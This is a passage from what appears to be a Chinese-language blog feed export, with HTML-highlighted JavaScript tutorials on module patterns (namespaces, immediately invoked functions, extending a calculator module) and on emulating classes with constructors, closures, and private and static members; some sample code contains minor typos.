        <span class="token punctuation">}</span>            oResult<span class="token punctuation">.</span>value <span class="token operator">=</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>用于计算的4个函数的命名冲突问题解决了，但是如果再定义一个名为calculator的命名空间还是会报错，虽然减少了命名冲突的问题，但是命名冲突还是存在。另外还会出现子命名空间的情况。</p><pre class=" language-js"><code class="language-js">calculator<span class="token punctuation">.</span>subcal <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>calculator<span class="token punctuation">.</span>subcal<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token string">'bar'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//命名空间越来越长，代码可读性差</span></code></pre><h2 id="函数的作用域（闭包）"><a href="#函数的作用域（闭包）" class="headerlink" title="函数的作用域（闭包）"></a>函数的作用域（闭包）</h2><pre class=" language-js"><code class="language-js">    <span class="token operator">&lt;</span>script<span class="token operator">></span>        <span class="token comment" spellcheck="true">//利用匿名自执行函数形成的封闭的函数作用域空间，达到私有化的目的。</span>        <span class="token keyword">var</span> calcultor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span><span class="token punctuation">{</span>                add<span class="token punctuation">:</span>add<span class="token punctuation">,</span>                subtract<span class="token punctuation">:</span>subtract<span class="token punctuation">,</span>                multiply<span class="token punctuation">:</span>multiply<span class="token punctuation">,</span>                divide<span class="token punctuation">:</span>divide            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取Dom</span>        <span class="token keyword">var</span> oX <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oY <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oOpt <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'opt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oCal <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'cal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oResult <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//为等号按钮添加单击事件</span>        oCal<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> x <span class="token operator">=</span> oX<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> y <span class="token operator">=</span> oY<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> opt <span class="token operator">=</span> oOpt<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'0'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                    resule <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            oResult<span class="token punctuation">.</span>value <span class="token operator">=</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>上述方法中，用于计算的4个方法被封装到了立即执行匿名函数中，添加返回值后，在全局可以通过“匿名函数.函数名（）”进行调用，这样有效的公开了公有方法，并且可以隐藏一些私有属性和元素，大部分第三方库都使用这种形式，例如jQuery。</p><h2 id="维护和扩展"><a href="#维护和扩展" class="headerlink" title="维护和扩展"></a>维护和扩展</h2><p>若现在需要添加取余方法，传统方式是在匿名函数中添加一个方法</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> calcultor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">mod</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span><span class="token punctuation">{</span>                add<span class="token punctuation">:</span>add<span class="token punctuation">,</span>                subtract<span class="token punctuation">:</span>subtract<span class="token punctuation">,</span>                multiply<span class="token punctuation">:</span>multiply<span class="token punctuation">,</span>                divide<span class="token punctuation">:</span>divide<span class="token punctuation">,</span>                mod<span class="token punctuation">:</span>mod            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>试想一下，如果这个计算模块由第三方库提供，难道要修改源码？</p><p>其实可以通过参数的形式将原来的模块和第三方库传递出去。</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//传递参数cal</span><span class="token keyword">var</span> calcultor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                   <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">function</span> <span class="token function">mod</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>                cal<span class="token punctuation">.</span>add <span class="token operator">=</span> add<span class="token punctuation">;</span>                cal<span class="token punctuation">.</span>subtract <span class="token operator">=</span> subtract<span class="token punctuation">;</span>                cal<span class="token punctuation">.</span>multiply <span class="token operator">=</span> multiply<span class="token punctuation">;</span>                cal<span class="token punctuation">.</span>divide <span class="token operator">=</span> divide<span class="token punctuation">;</span>                <span class="token keyword">return</span> cal<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>calculator<span class="token operator">||</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//下面的calculator已经把上面的给覆盖掉了</span><span class="token comment" spellcheck="true">//注意：在进行扩展的时候，优先查找要扩展的对象是否已经存在</span><span class="token keyword">var</span> calculator <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token punctuation">{</span>    cal<span class="token punctuation">.</span>mod <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> x<span class="token operator">%</span>y<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>calculator<span class="token operator">||</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当扩展该模块时，判断calculator是否存在，存在就使用存在的，不存在就重新创建</span>        <span class="token comment" spellcheck="true">//获取Dom</span>        <span class="token keyword">var</span> oX <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oY <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oOpt <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'opt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oCal <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'cal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oResult <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//为等号按钮添加单击事件</span>        oCal<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> x <span class="token operator">=</span> oX<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> y <span class="token operator">=</span> oY<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> opt <span class="token operator">=</span> oOpt<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'0'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            oResult<span class="token punctuation">.</span>value <span class="token operator">=</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>把模块化思想带入编程中，可以解决命名冲突和文件依赖等问题，后面会介绍Node.js是一个高度模块化的平台。</p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面向对象编程</title>
      <link href="2019/01/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
      <url>2019/01/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>JavaScript这种解释型的弱类型语言没有经典强类型语言中那种通过class等关键字实现类的封装方式，JavaScript中都是通过一些特性模仿实现的。</p><h1 id="如何创建一个类"><a href="#如何创建一个类" class="headerlink" title="如何创建一个类"></a>如何创建一个类</h1><p>首先声明一个函数保存在一个变量里，然后在这个函数（类）的内部通过this变量添加属性或者方法来实现对类添加属性或者方法。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> Book <span class="token operator">=</span> <span class="token function">functoin</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>bookname<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bookname <span class="token operator">=</span> bookname<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这样我们实现了封装，当使用功能方法时，我们不能直接使用这个Book类，需要用new关键字来实例化</span><span class="token comment" spellcheck="true">//可以使用点语法访问实例化对象的属性和方法</span><span class="token keyword">var</span> book <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Book</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'设计模式'</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>book<span class="token punctuation">.</span>bookname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设计模式</span></code></pre><h1 id="属性与方法的封装"><a href="#属性与方法的封装" class="headerlink" title="属性与方法的封装"></a>属性与方法的封装</h1><p>由于JavaScript的函数级作用域，声明在函数内部的变量以及方法在外界是访问不到的：私有变量，私有方法</p><p>函数内部通过this创建的属性可看做是对象的：共有属性，共有方法</p><p>而通过this创建的方法，不但可以访问到对象的共有属性与共有方法，而且还能访问到私有属性和私有方法，可以看做：特权方法</p><p>在对象创建时通过这些特权方法可以初始化实例对象的一些属性：构造器</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> Book <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//私有属性</span>    <span class="token keyword">var</span> num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//私有方法</span>    <span class="token keyword">function</span> <span class="token function">checkId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//特权方法</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>getName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>getPrice <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>setName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>setPrice <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//对象公有属性</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//构造器</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setPrice</span><span class="token punctuation">(</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>在类外面通过点语法定义的属性以及方法被称为类的静态共有属性和类的静态共有方法</strong></p><p><strong>prototype对象中的属性和方法称为共有属性和共有方法</strong></p><p>（ 无需实例化就可以调用的方法就叫静态方法。 ）</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//类静态公有属性，方法</span>Book<span class="token punctuation">.</span>isChinese <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>Book<span class="token punctuation">.</span>resetTime <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'new Time'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>Book<span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//公有属性</span>    isJSBook<span class="token punctuation">:</span> <span class="token boolean">false</span>    <span class="token comment" spellcheck="true">//公有方法</span>    display<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//测试代码</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Book</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'设计模式'</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span>；console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>isJSBook<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//11</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>isChinese<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Book<span class="token punctuation">.</span>isChinese<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//true</span>Book<span class="token punctuation">.</span><span class="token function">resetTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//undefined</span></code></pre><h1 id="通过闭包实现类的静态变量"><a href="#通过闭包实现类的静态变量" class="headerlink" title="通过闭包实现类的静态变量"></a>通过闭包实现类的静态变量</h1><p>闭包是有权访问另一个函数作用域中变量的函数，即在一个函数内部创建另外一个函数。我们将这个闭包作为创建对象的构造函数，这样他既是闭包又是可实例对象的函数，即可访问到类函数作用域中的变量，如</p><p>bookNum： 静态私有变量</p><p>checkBook()：静态私有方法</p><p>price,checkID()：闭包内部的私有变量以及私有方法</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//利用闭包实现</span><span class="token keyword">var</span> Book <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//静态私有变量</span>    <span class="token keyword">var</span> bookNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//静态私有方法</span>    <span class="token keyword">function</span> <span class="token function">checkBook</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//创建类</span>    <span class="token keyword">function</span> <span class="token function">book</span><span class="token punctuation">(</span>newId<span class="token punctuation">,</span>newName<span class="token punctuation">,</span>newPrice<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//私有变量</span>        <span class="token keyword">var</span> name<span class="token punctuation">,</span>price<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//私有方法</span>        <span class="token keyword">function</span> <span class="token function">checkID</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//特权方法</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>getName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>getPrice <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>setName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>setPrice <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//公有属性</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> newId<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//公有方法</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>copy <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>        bookNum<span class="token operator">++</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bookNum <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'我们仅出版100本书'</span><span class="token 